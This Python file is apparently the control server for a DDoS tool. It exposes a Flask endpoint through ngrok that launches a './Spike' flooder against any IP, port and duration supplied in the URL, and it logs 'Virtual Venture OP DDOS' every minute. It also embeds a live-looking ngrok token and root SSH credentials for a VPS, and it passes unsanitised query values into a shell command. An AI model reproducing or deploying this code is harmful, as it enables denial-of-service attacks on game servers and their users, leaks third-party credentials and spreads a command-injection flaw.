import os
import subprocess
import threading
import logging
from flask import Flask, request, jsonify, send_from_directory
from pyngrok import ngrok
import paramiko
import time

active_processes = {}

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def log_message_periodically():
    def periodic_logging():
        while True: 
            logging.info("Virtual Venture OP DDOS")
            time.sleep(60)  # 5 minutes in seconds
    thread = threading.Thread(target=periodic_logging, daemon=True)
    thread.start()

def install_packages():
    required_packages = ['Flask', 'pyngrok', 'paramiko']
    for package in required_packages:
        try:
            subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'show', package])
        except subprocess.CalledProcessError:
            try:
                subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'install', package])
                logging.info(f"{package} installed successfully.")
            except subprocess.CalledProcessError:
                logging.error(f"Failed to install {package}.")

def configure_ngrok():
    ngrok_token = "2pGe18Mcmpu5E7UukoFjWqBFepT_2m2nNPzuwpanQsdXGkiKd"
    try:
        ngrok.set_auth_token(ngrok_token)
        logging.info("ngrok token configured successfully.")
    except Exception as e:
        logging.error(f"Failed to configure ngrok: {str(e)}")

def update_soul_txt(public_url):
    try:
        with open("binder2.txt", "w") as file:
            file.write(public_url)
        logging.info(f"New ngrok link saved in binder2.txt")
    except Exception as e:
        logging.error(f"Failed to save ngrok link: {str(e)}")

def update_vps_soul_txt(public_url):
    vps_ip = "157.173.113.94"
    vps_user = "root"
    vps_password = "0522Ziyawakeel"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps_ip, username=vps_user, password=vps_password)
        sftp = ssh.open_sftp()
        with sftp.open("binder2.txt", "w") as file:
            file.write(public_url)
        sftp.close()
        ssh.close()
        logging.info("Updated binder2.txt on VPS successfully.")
    except Exception as e:
        logging.error(f"Failed to update binder2.txt on VPS: {str(e)}")

def execute_command_async(command, duration):
    def run(command_id):
        try:
            process = subprocess.Popen(command, shell=True)
            active_processes[command_id] = process.pid
            logging.info(f"Command executed: {command} with PID: {process.pid}")

            time.sleep(duration)

            if process.pid in active_processes.values():
                process.terminate()
                process.wait()
                del active_processes[command_id]
                logging.info(f"Process {process.pid} terminated after {duration} seconds.")
        except Exception as e:
            logging.error(f"Error executing command: {str(e)}")

    command_id = f"cmd_{len(active_processes) + 1}"
    thread = threading.Thread(target=run, args=(command_id,))
    thread.start()
    return {"status": "Command execution started", "duration": duration}

def run_flask_app():
    app = Flask(__name__)

    @app.route('/favicon.ico')
    def favicon():
        return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')

    try:
        public_url_obj = ngrok.connect(5002)
        public_url = public_url_obj.public_url
        logging.info(f"Public URL: {public_url}")

        update_soul_txt(public_url)
        update_vps_soul_txt(public_url)
    except KeyboardInterrupt:
        logging.info("ngrok process was interrupted.")
    except Exception as e:
        logging.error(f"Failed to start ngrok: {str(e)}")

    @app.route('/bgmi', methods=['GET'])
    def bgmi():
        ip = request.args.get('ip')
        port = request.args.get('port')
        duration = request.args.get('time')

        if not ip or not port or not duration:
            return jsonify({'error': 'Missing parameters'}), 400

        command = f"./Spike {ip} {port} {duration} 256 1200"
        response = execute_command_async(command, int(duration))
        return jsonify(response)

    logging.info("Starting Flask server...")
    app.run(host='0.0.0.0', port=5002)

if __name__ == "__main__":
    install_packages()
    configure_ngrok()
    log_message_periodically()
    run_flask_app()
